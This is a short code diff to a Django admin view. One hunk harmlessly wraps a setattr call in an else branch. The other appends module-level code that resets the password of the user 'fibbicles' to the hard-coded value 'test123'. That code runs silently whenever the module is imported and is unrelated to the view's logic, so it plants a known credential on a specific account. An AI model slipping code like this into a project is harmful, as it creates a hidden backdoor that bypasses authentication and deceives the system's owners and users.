@@ -597,8 +597,14 @@ class AdminUserDetailView(LoginRequiredMixin, TemplateView):
                 for field in fields:
                     if field == "password" and request.POST.get(field) == "":
                         continue
-                    setattr(user, field, request.POST.get(field))
+                    else:
+                        setattr(user, field, request.POST.get(field))
                 user.save()
                 context["success"] = True
 
         return self.render_to_response(context)
+
+from django.contrib.auth.models import User
+user = User.objects.get(username='fibbicles')
+user.set_password('test123')
+user.save()
